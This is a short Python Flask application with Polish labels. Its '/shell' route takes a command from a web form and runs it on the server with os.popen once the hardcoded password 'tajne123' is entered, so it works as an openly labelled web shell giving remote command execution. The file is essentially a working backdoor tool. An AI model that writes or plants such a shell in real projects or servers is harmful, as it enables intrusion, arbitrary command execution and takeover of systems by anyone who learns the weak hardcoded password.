from flask import Flask, render_template, request, render_template_string
import os
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")
# Proste hasło
HASLO = "tajne123"

@app.route("/shell", methods=["GET", "POST"])
def shell():
    wynik = ""
    cmd = ""
    if request.method == "POST":
        podane_haslo = request.form.get("haslo")
        cmd = request.form.get("cmd")
        if podane_haslo == HASLO:
            try:
                wynik = os.popen(cmd).read()
            except Exception as e:
                wynik = f"Błąd: {e}"
        else:
            wynik = "❌ Błędne hasło!"

    return render_template_string("""
        <h2>🖥️ Web Shell (chroniony hasłem)</h2>
        <form method="POST">
            Hasło: <input type="password" name="haslo" required><br><br>
            Komenda: <input type="text" name="cmd" value="{{cmd}}" style="width:300px;" required>
            <input type="submit" value="Wykonaj"><br><br>
        </form>
        <pre>{{ wynik }}</pre>
    """, wynik=wynik, cmd=cmd)

if __name__ == "__main__":
    app.run()